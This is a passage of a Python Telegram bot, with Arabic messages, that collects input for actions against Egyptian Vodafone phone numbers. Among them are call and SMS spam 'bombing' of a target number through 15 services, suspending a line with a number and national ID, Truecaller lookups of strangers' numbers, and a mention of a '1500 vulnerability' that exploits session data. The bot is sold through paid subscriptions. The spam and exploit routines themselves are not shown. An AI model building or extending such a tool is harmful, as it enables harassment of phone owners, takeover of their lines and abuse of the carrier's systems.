                f"✅ إعدادات سبام المكالمات:\n\n📱 الرقم: {number}\n🔢 عدد المكالمات: {count}\n⏱️ الفاصل: {delay} ثانية\n\nاضغط للبدء:",
                reply_markup=keyboard)
        except ValueError:
            bot.send_message(user_id, "❌ الرجاء إدخال رقم صحيح!")

    # ===== خطوات السبام =====
    elif step == "spam_ask_number":
        if not text.isdigit() or len(text) != 11 or not text.startswith('01'):
            bot.send_message(user_id, "❌ رقم غير صالح! أدخل رقم 11 رقم يبدأ بـ 01:")
            return
        data = state.get('data', {})
        data['number'] = text
        save_user_state(user_id, step="spam_ask_count", action="spam", data=data)
        bot.send_message(user_id, "📧 أدخل عدد الرسائل المراد إرسالها:")
    
    elif step == "spam_ask_count":
        try:
            count = int(text)
            if count <= 0:
                bot.send_message(user_id, "❌ عدد الرسائل يجب أن يكون أكبر من صفر!")
                return
            data = state.get('data', {})
            data['count'] = count
            save_user_state(user_id, step="spam_ask_delay", action="spam", data=data)
            bot.send_message(user_id, "⏱️ أدخل الوقت بالثواني بين كل رسالة:")
        except ValueError:
            bot.send_message(user_id, "❌ الرجاء إدخال رقم صحيح!")
    
    elif step == "spam_ask_delay":
        try:
            delay = float(text)
            if delay <= 0:
                bot.send_message(user_id, "❌ الوقت يجب أن يكون أكبر من صفر!")
                return
            data = state.get('data', {})
            number = data['number']
            count = data['count']
            # تخزين في spam_data
            spam_data.setdefault(user_id, {})
            spam_data[user_id][number] = {'count': count, 'delay': delay}
            # إنشاء زر بدء الإرسال
            keyboard = types.InlineKeyboardMarkup()
            keyboard.add(types.InlineKeyboardButton(f"🚀 إرسال إلى {number}", callback_data=f"spam_send_{number}"))
            bot.send_message(user_id, f"✅ تم تسجيل {count} رسائل للرقم {number} بفاصل {delay} ثانية.\nكل رسالة ترسل إلى 15 خدمة مختلفة!", reply_markup=keyboard)
            clear_user_state(user_id)
        except ValueError:
            bot.send_message(user_id, "❌ الرجاء إدخال رقم صحيح!")
    
    # ===== خطوات الاشتراك المميز الجديد (نظام الموافقة اليدوية) =====
    elif step == "auto_premium_waiting_transferred":
        transferred_from = text.strip()
        if not transferred_from.isdigit() or len(transferred_from) != 11 or not transferred_from.startswith('01'):
            bot.send_message(user_id, "❌ رقم غير صحيح! أعد إرسال الرقم (11 رقم يبدأ بـ 01):")
            return
        
        data = state.get('data', {})
        data['transferred_number'] = transferred_from
        save_user_state(user_id, step="auto_premium_waiting_screenshot", action="premium_subscription", data=data)
        bot.send_message(user_id, "✅ تم تسجيل الرقم. الآن أرسل صورة التحويل كدليل.")
    
    # ===== خطوات خدمة 500 وحدة متجددة (جديد) =====
    elif step == "500_units_target":
        target = text.strip()
        if not target.isdigit() or len(target) != 11 or not target.startswith('01'):
            bot.send_message(user_id, "❌ رقم غير صحيح! أعد إرسال الرقم (11 رقم يبدأ بـ 01):")
            return
        # عرض تأكيد قبل الإرسال
        run_500_units_confirm(user_id, message.message_id, target)
    
    # ===== خطوات تأكيد ريح بالك (جديد) =====
    elif step == "rehbalak_confirm":
        # ننتظر تأكيد عبر callback
        pass
    
    # ===== خطوات ثغرة 1500 (تم تعديلها لاستخدام بيانات الجلسة) =====
    # لم تعد هناك حاجة لهذه الخطوات لأن الثغرة تستخدم بيانات الجلسة مباشرة
    
    # ===== خطوات إدارة القنوات الإجبارية =====
    elif step == "admin_add_channel_name":
        admin_add_channel_name(user_id, text)
    elif step == "admin_add_channel_link":
        admin_add_channel_link(user_id, text)
    elif step == "admin_add_channel_username":
        admin_add_channel_username(user_id, text)
    elif step == "admin_change_dev_username":
        admin_change_dev_username_save(user_id, text)
    
    # ===== باقي الحالات الأخرى (بدون تغيير) =====
    elif step == "change_password_old":
        old_password = text.strip()
        data = state.get('data', {})
        number = data.get('number')
        
        save_user_state(user_id, step="change_password_new", action="change_password",
                       data={'number': number, 'old_password': old_password})
        
        bot.send_message(user_id, "🔐 تغيير كلمة المرور\n\nالخطوة 2 من 2:\n🔑 أرسل كلمة المرور الجديدة:")
        
    elif step == "change_password_new":
        new_password = text.strip()
        data = state.get('data', {})
        number = data.get('number')
        old_password = data.get('old_password')
        
        msg = bot.send_message(user_id, "⏳ جاري تغيير كلمة المرور...")
        
        token = get_access_token_for_password_change(number, old_password)
        if token:
            success = change_vodafone_password(number, old_password, new_password, token)
            if success:
                result = "✅ تم تغيير كلمة المرور بنجاح!"
            else:
                result = "❌ فشل تغيير كلمة المرور. تأكد من عدم استخدام كلمة المرور الجديدة من قبل."
        else:
            result = "❌ فشل تسجيل الدخول. تحقق من كلمة المرور القديمة."
        
        bot.edit_message_text(result, user_id, msg.message_id)
        clear_user_state(user_id)
    
    elif step == "get_suspend_number":
        if not text or not text.strip().isdigit() or len(text.strip()) != 11:
            bot.send_message(user_id, "❌ الرقم يجب أن يكون 11 رقم فقط. أعد إرسال الرقم:")
            return
        
        data = state.get('data', {})
        password = data.get('password')
        
        save_user_state(user_id, step="get_suspend_national_id", action="suspend_line",
                       data={'phone': text.strip(), 'password': password})
        
        bot.send_message(user_id, "⏸️ إيقاف خط فودافون\n\nالخطوة 2 من 3:\n🆔 أرسل الرقم القومي (14 رقم):")
    
    elif step == "get_suspend_national_id":
        national_id = text.strip()
        
        if not national_id.isdigit() or len(national_id) != 14:
            bot.send_message(user_id, "❌ الرقم القومي يجب أن يكون 14 رقم. أعد إرساله:")
            return
        
        data = state.get('data', {})
        data['national_id'] = national_id
        
        confirm_text = f"""
⚠️ تأكيد إيقاف الخط

هل أنت متأكد من إيقاف الخط التالي؟
• الرقم المراد إيقافه: {data['phone']}
• الرقم القومي: {national_id}

اضغط تأكيد لبدء عملية الإيقاف.
        """
        
        confirm_markup = types.InlineKeyboardMarkup()
        confirm_markup.add(types.InlineKeyboardButton("✅ تأكيد إيقاف الخط", callback_data='confirm_suspend'))
        
        save_user_state(user_id, step="waiting_suspend_confirmation", action="suspend_line", data=data)
        
        bot.send_message(user_id, confirm_text, reply_markup=confirm_markup)
    
    elif step == "send_invitation_member":
        if not text or not text.strip().isdigit() or len(text.strip()) != 11:
            bot.send_message(user_id, "❌ الرقم يجب أن يكون 11 رقم. أعد إرساله:")
            return
        
        data = state.get('data', {})
        data['member_number'] = text.strip()
        
        save_user_state(user_id, step="send_invitation_quota", action="send_invitation", data=data)
        
        bot.send_message(user_id, "📤 إرسال دعوة فليكس\n\nالخطوة 2 من 2:\n📊 أرسل نسبة الحصة للعضو:\n(اختر من: 10%, 20%, 40%)")
        
    elif step == "send_invitation_quota":
        quota = text.strip().replace('%', '')
        if quota not in ['10', '20', '40']:
            bot.send_message(user_id, "❌ النسبة يجب أن تكون 10, 20, أو 40. أعد إرسالها:")
            return
        
        data = state.get('data', {})
        
        msg = bot.send_message(user_id, "⏳ جاري إرسال الدعوة...")
        
        def run_send_invitation():
            result = send_invitation_only(
                data['owner_number'],
                data['owner_password'],
                data['member_number'],
                quota
            )
            if result["success"]:
                final_text = f"✅ {result['message']}\n\n👑 المالك: {result['details']['owner']}\n👤 العضو: {result['details']['member']}\n⏰ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            else:
                final_text = f"❌ {result['message']}"
            bot.edit_message_text(final_text, user_id, msg.message_id)
            clear_user_state(user_id)
        
        Thread(target=run_send_invitation).start()
    
    elif step == "accept_invitation_owner":
        if not text or not text.strip().isdigit() or len(text.strip()) != 11:
            bot.send_message(user_id, "❌ الرقم يجب أن يكون 11 رقم. أعد إرساله:")
            return
        
        data = state.get('data', {})
        owner_number = text.strip()
        
        msg = bot.send_message(user_id, "⏳ جاري قبول الدعوة...")
        
        def run_accept_invitation():
            result = accept_invitation_only(
                data['member_number'],
                data['member_password'],
                owner_number
            )
            if result["success"]:
                final_text = f"✅ {result['message']}\n\n👑 المالك: {result['details']['owner']}\n👤 العضو: {result['details']['member']}\n⏰ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            else:
                final_text = f"❌ {result['message']}"
            bot.edit_message_text(final_text, user_id, msg.message_id)
            clear_user_state(user_id)
        
        Thread(target=run_accept_invitation).start()
    
    elif step == "delete_invitation_member":
        if not text or not text.strip().isdigit() or len(text.strip()) != 11:
            bot.send_message(user_id, "❌ الرقم يجب أن يكون 11 رقم. أعد إرساله:")
            return
        
        member_number = text.strip()
        data = state.get('data', {})
        
        msg = bot.send_message(user_id, "⏳ جاري حذف الدعوة...")
        
        def run_delete_invitation():
            result = delete_family_invitation(
                data['owner_number'],
                data['owner_password'],
                member_number
            )
            if result["success"]:
                final_text = f"✅ {result['message']}\n\n👑 المالك: {result['details']['owner']}\n👤 العضو: {result['details']['member']}\n⏰ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            else:
                final_text = f"❌ {result['message']}"
            bot.edit_message_text(final_text, user_id, msg.message_id)
            clear_user_state(user_id)
        
        Thread(target=run_delete_invitation).start()
    
    elif step == "change_quota_member":
        if not text or not text.strip().isdigit() or len(text.strip()) != 11:
            bot.send_message(user_id, "❌ الرقم يجب أن يكون 11 رقم. أعد إرساله:")
            return
        
        data = state.get('data', {})
        data['member_number'] = text.strip()
        
        save_user_state(user_id, step="change_quota_percentage", action="change_quota", data=data)
        
        bot.send_message(user_id, "📈 تغيير نسبة الحصة\n\nالخطوة 2 من 2:\n📊 أرسل النسبة الجديدة:\n(اختر من: 10%, 20%, 40%)")
    
    elif step == "change_quota_percentage":
        new_quota = text.strip().replace('%', '')
        if new_quota not in ['10', '20', '40']:
            bot.send_message(user_id, "❌ النسبة يجب أن تكون 10, 20, أو 40. أعد إرسالها:")
            return
        
        data = state.get('data', {})
        
        msg = bot.send_message(user_id, "⏳ جاري تغيير نسبة الحصة...")
        
        def run_change_quota():
            result = change_quota_percentage(
                data['owner_number'],
                data['owner_password'],
                data['member_number'],
                new_quota
            )
            if result["success"]:
                final_text = f"✅ {result['message']}\n\n👑 المالك: {result['details']['owner']}\n👤 العضو: {result['details']['member']}\n⏰ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            else:
                final_text = f"❌ {result['message']}"
            bot.edit_message_text(final_text, user_id, msg.message_id)
            clear_user_state(user_id)
        
        Thread(target=run_change_quota).start()
    
    elif step == "send_accept_member":
        if not text or not text.strip().isdigit() or len(text.strip()) != 11:
            bot.send_message(user_id, "❌ الرقم يجب أن يكون 11 رقم. أعد إرساله:")
            return
        
        data = state.get('data', {})
        data['member_number'] = text.strip()
        
        save_user_state(user_id, step="send_accept_password", action="send_and_accept", data=data)
        
        bot.send_message(user_id, "🎯 إرسال وقبول دعوة فليكس\n\nالخطوة 2 من 3:\n🔐 أرسل كلمة مرور العضو الجديد:")
    
    elif step == "send_accept_password":
        member_password = text.strip()
        data = state.get('data', {})
        data['member_password'] = member_password
        
        save_user_state(user_id, step="send_accept_quota", action="send_and_accept", data=data)
        
        bot.send_message(user_id, "🎯 إرسال وقبول دعوة فليكس\n\nالخطوة 3 من 3:\n📊 أرسل نسبة الحصة للعضو:\n(اختر من: 10%, 20%, 40%)")
    
    elif step == "send_accept_quota":
        quota = text.strip().replace('%', '')
        if quota not in ['10', '20', '40']:
            bot.send_message(user_id, "❌ النسبة يجب أن تكون 10, 20, أو 40. أعد إرسالها:")
            return
        
        data = state.get('data', {})
        
        msg = bot.send_message(user_id, "⏳ جاري إرسال وقبول الدعوة...")
        
        def run_send_accept():
            result = send_and_accept_invitation(
                data['owner_number'],
                data['owner_password'],
                data['member_number'],
                data['member_password'],
                quota
            )
            if result["success"]:
                final_text = f"✅ {result['message']}\n\n👑 المالك: {result['details']['owner']}\n👤 العضو: {result['details']['member']}\n⏰ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            else:
                final_text = f"❌ {result['message']}"
            bot.edit_message_text(final_text, user_id, msg.message_id)
            clear_user_state(user_id)
        
        Thread(target=run_send_accept).start()
    
    elif step == "charge_waiting_for_target":
        target = text.strip()
        if not target.isdigit() or len(target) != 11 or not target.startswith('01'):
            bot.send_message(user_id, "❌ رقم غير صحيح! يجب أن يكون 11 رقم ويبدأ بـ 01.\nأعد إرسال الرقم:")
            return
        
        session = get_user_session(user_id)
        if not session:
            bot.send_message(user_id, "❌ يجب تسجيل الدخول أولاً!")
            clear_user_state(user_id)
            return
        
        save_user_state(user_id, step="charge_waiting_for_card", action="charge_cards",
                       data={'target_number': target, 'token': session['token'], 'msisdn': session['number']})
        bot.send_message(user_id, "💳 أرسل رقم الكارت (أرقام فقط):")
    
    elif step == "charge_waiting_for_card":
        card_number = text.strip()
        if not card_number.isdigit():
            bot.send_message(user_id, "❌ رقم الكارت يجب أن يحتوي على أرقام فقط.\nأعد إرسال رقم الكارت:")
            return
        
        data = state.get('data', {})
        target_number = data.get('target_number')
        token = data.get('token')
        msisdn = data.get('msisdn')
        
        if not target_number or not token or not msisdn:
            bot.send_message(user_id, "❌ حدث خطأ. الرجاء البدء من جديد.")
            clear_user_state(user_id)
            return
        
        msg = bot.send_message(user_id, "⏳ جاري شحن الرصيد...")
        
        def run_charge():
            result = recharge_card_with_token(user_id, token, msisdn, target_number, card_number)
            try:
                bot.edit_message_text(result['message'], user_id, msg.message_id)
            except:
                bot.send_message(user_id, result['message'])
            clear_user_state(user_id)
        
        Thread(target=run_charge).start()
    
    elif step == "truecaller_waiting_number":
        phone = text.strip()
        if not phone.isdigit() or len(phone) != 11 or not phone.startswith('01'):
            bot.send_message(user_id, "❌ رقم غير صحيح! يجب أن يكون 11 رقم ويبدأ بـ 01.\nأعد إرسال الرقم:")
            return
        
        msg = bot.send_message(user_id, "⏳ جاري البحث...")
        run_truecaller_search(user_id, msg.message_id, phone)
    
    elif step == "flex_transfer_receiver":
        receiver = text.strip()
        if not receiver.isdigit() or len(receiver) != 11 or not receiver.startswith('01'):
            bot.send_message(user_id, "❌ رقم المستلم غير صحيح! يجب أن يكون 11 رقم ويبدأ بـ 01.\nأعد إرسال الرقم:")
            return
        run_flex_transfer_amount(user_id, message.message_id, receiver)
    
    elif step == "flex_transfer_amount":
        amount = text.strip()
        try:
            amount_float = float(amount)
        except:
            bot.send_message(user_id, "❌ المبلغ غير صحيح. أعد إرسال المبلغ:")
            return
        state_data = state.get('data', {})
        sender_number = state_data['sender_number']
        token = state_data['token']
        receiver_number = state_data['receiver_number']
        success, msg = execute_flex_transfer(sender_number, token, receiver_number, amount_float)
        bot.send_message(user_id, msg, parse_mode='HTML')
        clear_user_state(user_id)
    
    elif step == "bt_waiting_for_receiver":
        receiver = text.strip()
        if not receiver.isdigit() or len(receiver) != 11 or not receiver.startswith('01'):
            bot.send_message(user_id, "❌ رقم المستلم غير صحيح! يجب أن يكون 11 رقم ويبدأ بـ 01.\nأعد إرسال الرقم:")
            return
        
        data = state.get('data', {})
        data['receiver_number'] = receiver
        save_user_state(user_id, step="bt_waiting_for_amount", action="balance_transfer", data=data)
        
        bot.send_message(user_id, "💰 أرسل المبلغ المراد تحويله (الحد الأقصى 50 جنيه):")
    
    elif step == "bt_waiting_for_amount":
        amount_text = text.strip()
        try:
            amount = float(amount_text)
            if amount <= 0 or amount > 50:
                bot.send_message(user_id, "❌ المبلغ يجب أن يكون بين 1 و 50 جنيه. أعد إرسال المبلغ:")
                return
        except:
            bot.send_message(user_id, "❌ المبلغ غير صحيح! أعد إرسال المبلغ:")
            return
        
        data = state.get('data', {})
        data['amount'] = amount
        save_user_state(user_id, step="bt_waiting_for_confirmation", action="balance_transfer", data=data)
        
        fees_text = f"""
💰 تفاصيل التحويل:

• الرقم المستلم: {data['receiver_number']}
• المبلغ المراد تحويله: {amount} جنيه
• رسوم التحويل (2% بحد أدنى 0.2 جنيه): سيتم خصمها من الرصيد
• سيتم إرسال كود التفعيل لهاتفك

هل تريد تأكيد التحويل?
        """
        
        keyboard = InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            InlineKeyboardButton("✅ تأكيد", callback_data="bt_confirm"),
            InlineKeyboardButton("❌ إلغاء", callback_data="bt_cancel")
        )
        
        bot.send_message(user_id, fees_text, reply_markup=keyboard)
    
    elif step == "bt_waiting_for_code":
        code = text.strip()
        if len(code) != 8 or not code.isdigit():
            bot.send_message(user_id, "❌ كود التحقق يجب أن يكون 8 أرقام!\nأعد إدخال الكود:")
            return
        
        data = state.get('data', {})
        
        msg = bot.send_message(user_id, "✅ جاري تأكيد وتحويل الرصيد...")
        
        def run_transfer_code():
            sender_number = data.get('sender_number')
            receiver_number = data.get('receiver_number')
            amount = data.get('amount')
            token = data.get('token')
            
            bt = VodafoneBalanceTransfer(token, sender_number)
            result = bt.confirm_transfer(receiver_number, amount, code)
            
            if result["success"]:
                fees = amount * 0.02
                if fees < 0.2:
                    fees = 0.2
                add_balance_transfer_history(user_id, sender_number, receiver_number, amount, fees, "ناجح")
                
                result_text = f"🎉 {result['message']}\n\n✅ تمت العملية بنجاح!\n\n💰 المبلغ المحول: {amount} جنيه\n📱 إلى: {receiver_number}"
                bot.edit_message_text(result_text, user_id, msg.message_id)
                clear_user_state(user_id)
            else:
                if result.get("invalid_code", False):
                    bot.edit_message_text(
                        "❌ كود التحقق غير صحيح!\nأعد إدخال الكود:",
                        user_id, msg.message_id,
                        reply_markup=InlineKeyboardMarkup().add(
                            InlineKeyboardButton("🔄 إعادة إرسال الكود", callback_data="bt_resend_code"),
                            InlineKeyboardButton("❌ إلغاء", callback_data="bt_cancel")
                        )
                    )
                else:
                    bot.edit_message_text(f"❌ {result['message']}", user_id, msg.message_id)
                    clear_user_state(user_id)
        
        Thread(target=run_transfer_code).start()
    
    elif step == "admin_add_subscription_user":
        if not text or not text.strip().isdigit():
            bot.send_message(user_id, "❌ معرف المستخدم يجب أن يكون رقم. أعد إرساله:")
            return
        
        target_user_id = int(text.strip())
        save_user_state(user_id, step="admin_add_subscription_days", action="admin_add_subscription",
                       data={'target_user_id': target_user_id})
        
        bot.send_message(user_id, f"👥 إضافة اشتراك للمستخدم {target_user_id}\n\n📅 أرسل عدد الأيام للإضافة:")
    
    elif step == "admin_add_subscription_days":
        if not text or not text.strip().isdigit() or int(text.strip()) <= 0:
            bot.send_message(user_id, "❌ عدد الأيام يجب أن يكون رقماً موجباً. أعد إرساله:")
            return
        
        days = int(text.strip())
        data = state.get('data', {})
        target_user_id = data.get('target_user_id')
        
        new_end_date = add_subscription(target_user_id, days, user_id)
        
        # إرسال إشعار للمستخدم
        try:
            bot.send_message(target_user_id, f"✅ تم إضافة اشتراك لك لمدة {days} يوم.\n📅 تاريخ الانتهاء: {new_end_date.strftime('%Y-%m-%d %H:%M:%S')}")
        except Exception as e:
            logger.error(f"Failed to notify user {target_user_id}: {e}")
        
        bot.send_message(user_id, f"✅ تم إضافة {days} يوم للمستخدم {target_user_id}\n📅 تاريخ انتهاء الاشتراك الجديد: {new_end_date.strftime('%Y-%m-%d %H:%M:%S')}")
        clear_user_state(user_id)
    
    elif step == "admin_remove_subscription_user":
        if not text or not text.strip().isdigit():
            bot.send_message(user_id, "❌ معرف المستخدم يجب أن يكون رقم. أعد إرساله:")
            return
        
        target_user_id = int(text.strip())
        save_user_state(user_id, step="admin_remove_subscription_days", action="admin_remove_subscription",
                       data={'target_user_id': target_user_id})
        
        bot.send_message(user_id, f"🗑️ حذف أيام من اشتراك المستخدم {target_user_id}\n\n📅 أرسل عدد الأيام للحذف:")
    
    elif step == "admin_remove_subscription_days":
        if not text or not text.strip().isdigit() or int(text.strip()) <= 0:
            bot.send_message(user_id, "❌ عدد الأيام يجب أن يكون رقماً موجباً. أعد إرساله:")
            return
        
        days = int(text.strip())
        data = state.get('data', {})
        target_user_id = data.get('target_user_id')
        
        new_end_date, is_active = remove_subscription_days(target_user_id, days, user_id)
        
        if new_end_date:
            status = "نشط" if is_active else "غير نشط"
            bot.send_message(user_id, f"✅ تم حذف {days} يوم من اشتراك المستخدم {target_user_id}\n📅 تاريخ انتهاء الاشتراك الجديد: {new_end_date.strftime('%Y-%m-%d %H:%M:%S')}\n📊 حالة الاشتراك: {status}")
        else:
            bot.send_message(user_id, f"❌ لا يوجد اشتراك للمستخدم {target_user_id}")
        
        clear_user_state(user_id)
    
    elif step == "admin_check_subscription":
        if not text or not text.strip().isdigit():
            bot.send_message(user_id, "❌ معرف المستخدم يجب أن يكون رقم. أعد إرساله:")
            return
        
        target_user_id = int(text.strip())
        sub_info = get_subscription_info(target_user_id)
        
        if sub_info:
            start_date = sub_info['start_date'].strftime('%Y-%m-%d %H:%M:%S') if sub_info['start_date'] else "غير محدد"
            end_date = sub_info['end_date'].strftime('%Y-%m-%d %H:%M:%S') if sub_info['end_date'] else "غير محدد"
            status = "✅ نشط" if sub_info['is_active'] else "❌ غير نشط"
            
            msg = f"📊 معلومات اشتراك المستخدم {target_user_id}\n\n"
            msg += f"📅 تاريخ البدء: {start_date}\n"
            msg += f"📅 تاريخ الانتهاء: {end_date}\n"
            msg += f"📊 الأيام المتبقية: {sub_info['days_remaining']}\n"
            msg += f"📌 الحالة: {status}\n"
            msg += f"🕐 آخر تحديث: {sub_info['last_check'].strftime('%Y-%m-%d %H:%M:%S')}"
            
            bot.send_message(user_id, msg)
        else:
            bot.send_message(user_id, f"❌ لا يوجد اشتراك للمستخدم {target_user_id}")
        
        clear_user_state(user_id)
    
    elif step == "admin_edit_button":
        parts = text.strip().split('|', 1)
        if len(parts) != 2:
            bot.send_message(user_id, "❌ صيغة غير صحيحة. استخدم: key|الاسم الجديد")
            return
        
        key, new_name = parts
        key = key.strip()
        new_name = new_name.strip()
        
        if key in BUTTON_NAMES:
            old_name = BUTTON_NAMES[key]
            BUTTON_NAMES[key] = new_name
            bot.send_message(user_id, f"✅ تم تعديل اسم الزر\n\n{key}\nمن: {old_name}\nإلى: {new_name}")
        else:
            bot.send_message(user_id, f"❌ المفتاح {key} غير موجود.\n\nالأزرار المتاحة:\n" + "\n".join([f"{k}" for k in BUTTON_NAMES.keys()]))
        
        clear_user_state(user_id)
    
    elif step == "admin_broadcast_message":
        broadcast_text = text.strip()
        if not broadcast_text:
            bot.send_message(user_id, "❌ الرسالة لا يمكن أن تكون فارغة. أعد إرسالها:")
            return
        
        all_users = get_all_users_ids()
        sent_count = 0
        for uid in all_users:
            try:
                bot.send_message(uid, broadcast_text)
                sent_count += 1
                time.sleep(0.05)
            except Exception as e:
                logger.error(f"فشل إرسال الرسالة إلى {uid}: {e}")
        
        bot.send_message(user_id, f"📢 تم إرسال الرسالة إلى {sent_count} مستخدم.")
        clear_user_state(user_id)
    
    elif step == "admin_ban_user":
        if not text or not text.strip().isdigit():
            bot.send_message(user_id, "❌ معرف المستخدم يجب أن يكون رقم. أعد إرساله:")
            return
        
        target_user_id = int(text.strip())
        ban_user(target_user_id)
        bot.send_message(user_id, f"🚫 تم حظر المستخدم {target_user_id} بنجاح.")
        clear_user_state(user_id)
    
    elif step == "admin_unban_user":
        if not text or not text.strip().isdigit():
            bot.send_message(user_id, "❌ معرف المستخدم يجب أن يكون رقم. أعد إرساله:")
            return
        
        target_user_id = int(text.strip())
        unban_user(target_user_id)
        bot.send_message(user_id, f"✅ تم إلغاء حظر المستخدم {target_user_id} بنجاح.")
        clear_user_state(user_id)
    
    elif step == "admin_change_cash_number":
        new_number = text.strip()
        if not new_number.isdigit() or len(new_number) != 11 or not new_number.startswith('01'):
            bot.send_message(user_id, "❌ رقم غير صحيح! أعد إرسال الرقم (11 رقم يبدأ بـ 01):")
            return
        set_vodafone_cash_number(new_number, user_id)
        bot.send_message(user_id, f"✅ تم تغيير رقم فودافون كاش إلى {new_number}")
        clear_user_state(user_id)
    
    elif step == "admin_add_assistant":
        if not text or not text.strip().isdigit():
            bot.send_message(user_id, "❌ معرف المستخدم يجب أن يكون رقم. أعد إرساله:")
            return
        
        target_user_id = int(text.strip())
        add_assistant_admin(target_user_id)
        bot.send_message(user_id, f"✅ تم إضافة المستخدم {target_user_id} كمساعد أدمن.")
        clear_user_state(user_id)
    
    elif step == "admin_remove_assistant":
        if not text or not text.strip().isdigit():
            bot.send_message(user_id, "❌ معرف المستخدم يجب أن يكون رقم. أعد إرساله:")
            return
        
        target_user_id = int(text.strip())
        remove_assistant_admin(target_user_id)
        bot.send_message(user_id, f"✅ تم إزالة المستخدم {target_user_id} من المساعدين.")
        clear_user_state(user_id)
    
    elif step == "admin_change_family_link":
        new_link = text.strip()
        if not new_link.startswith(('https://t.me/', '@')):
            bot.send_message(user_id, "❌ الرابط يجب أن يبدأ بـ https://t.me/ أو @username\nأعد إرسال الرابط:")
            return
        set_family_bot_link(new_link, user_id)
        bot.send_message(user_id, f"✅ تم تغيير رابط بوت تطير إلى {new_link}")
        clear_user_state(user_id)
    
    else:
        if user_id in ADMIN_IDS:
            bot.send_message(
                user_id,
                "⚠️ الأمر غير معروف!\n\n"
                "الرجاء استخدام الأزرار في القائمة.\n\nتصلي على سيدنا محمد ﷺ",
                reply_markup=create_main_keyboard_for_admin()
            )
        else:
            bot.send_message(
                user_id,
                "⚠️ الأمر غير معروف!\n\n"
                "الرجاء استخدام الأزرار في القائمة.\n\nتصلي على سيدنا محمد ﷺ",
                reply_markup=create_main_keyboard_for_user(user_id)
            )
        clear_user_state(user_id)

def admin_toggle_buttons_list(user_id):
    buttons_info = []
    for key, name in BUTTON_NAMES.items():
        visible = get_button_visibility(key)
        status = "✅ ظاهر للجميع" if visible else "🔒 ظاهر للأدمن فقط"
        buttons_info.append((key, name, status))
    
    text = "👁️ إظهار/إخفاء الأزرار:\n\n"
    markup = InlineKeyboardMarkup(row_width=1)
    
    for key, name, status in buttons_info:
        btn_text = f"{name} - {status}"
        markup.add(InlineKeyboardButton(btn_text, callback_data=f"toggle_btn_{key}"))
    
    markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_admin"))
    
    bot.send_message(user_id, text, reply_markup=markup)

# ===== معالج الصور (تم تعديله ليشمل صورة الاشتراك المميز) =====
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = message.chat.id
    state = get_user_state(user_id)
    
    if state and state.get('step') == "auto_premium_waiting_screenshot":
        # المستخدم في مرحلة إرسال الصورة بعد إرسال الرقم
        data = state.get('data', {})
        transferred_from = data.get('transferred_number')
        user_number = data.get('user_number')
        plan = data.get('plan', 'monthly')  # افتراضي شهري إذا لم يوجد
        
        if not transferred_from:
            bot.send_message(user_id, "❌ يرجى إرسال الرقم المحول منه أولاً.")
            return
        
        plan_text = "أسبوعي" if plan == "weekly" else "شهري"
        plan_days = WEEKLY_DAYS if plan == "weekly" else MONTHLY_DAYS
        plan_price = WEEKLY_PRICE if plan == "weekly" else MONTHLY_PRICE
        
        # إرسال البيانات للمطور
        dev_id = ADMIN_IDS[0]
        try:
            caption = f"📥 طلب اشتراك مميز جديد\n\n"
            caption += f"👤 المستخدم: {message.from_user.first_name}\n"
            caption += f"🆔 يوزر: @{message.from_user.username}\n" if message.from_user.username else "🆔 يوزر: لا يوجد\n"
            caption += f"🆔 معرف المستخدم: `{user_id}`\n"
            caption += f"📱 رقم المستخدم في البوت: `{user_number}`\n"
            caption += f"💰 الخطة: {plan_text} - {plan_price} جنيه لمدة {plan_days} يوم\n"
            caption += f"📱 الرقم المحول منه: `{transferred_from}`\n"
            caption += f"🕐 الوقت: {datetime.now(egypt_tz).strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            caption += "يرجى الموافقة أو الرفض باستخدام الأزرار أدناه."
            
            # إرسال الصورة مع الكابشن
            bot.send_photo(dev_id, message.photo[-1].file_id, caption=caption, parse_mode='Markdown',
                          reply_markup=types.InlineKeyboardMarkup().row(
                              types.InlineKeyboardButton("✅ موافقة", callback_data=f"approve_sub_{plan}_{user_id}"),
                              types.InlineKeyboardButton("❌ رفض", callback_data=f"reject_sub_{plan}_{user_id}")
                          ))
            
            bot.send_message(user_id, "✅ تم إرسال طلبك إلى المطور. سيتم إعلامك بقرار المطور قريباً.")
            clear_user_state(user_id)
        except Exception as e:
            bot.send_message(user_id, f"❌ حدث خطأ أثناء إرسال الطلب: {e}")
            clear_user_state(user_id)
        return
    else:
        # إذا لم يكن المستخدم في حالة الاشتراك، يمكننا تجاهل الصورة أو الرد برسالة
        bot.send_message(user_id, "❌ لم نكن نتوقع صورة الآن.")

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    user_id = call.message.chat.id
    action = call.data
    
    try:
        bot.answer_callback_query(call.id)
        
        if is_user_banned(user_id):
            bot.answer_callback_query(call.id, "🚫 لقد تم حظرك!", show_alert=True)
            return
        
        if not is_bot_running() and user_id not in ADMIN_IDS:
            bot.answer_callback_query(call.id, "⚠️ البوت قيد التحديث حالياً", show_alert=True)
            return
        
        # التحقق من الاشتراك (قنوات + باقة)
        if user_id not in ADMIN_IDS:
            is_joined, markup, caption, days_left, end_date = check_subscription(user_id)
            if not is_joined and action != "check_sub":
                bot.answer_callback_query(call.id, "🚫 يجب عليك الاشتراك أولاً!", show_alert=True)
                return
        
        if action == "check_sub":
            is_joined, markup, caption, days_left, end_date = check_subscription(user_id)
            if is_joined:
                try:
                    bot.edit_message_text(WELCOME_MESSAGE + "\n\nاضغط على زر تسجيل الدخول للبدء:", user_id, call.message.message_id, reply_markup=create_main_buttons_keyboard())
                except telebot.apihelper.ApiTelegramException as e:
                    if "message is not modified" not in str(e):
                        bot.send_message(user_id, WELCOME_MESSAGE + "\n\nاضغط على زر تسجيل الدخول للبدء:", reply_markup=create_main_buttons_keyboard())
            else:
                try:
                    bot.edit_message_text(caption, user_id, call.message.message_id, reply_markup=markup, disable_web_page_preview=True)
                except telebot.apihelper.ApiTelegramException as e:
                    if "message is not modified" not in str(e):
                        bot.send_message(user_id, caption, reply_markup=markup, disable_web_page_preview=True)
        
        elif action == "main_buttons":
            try:
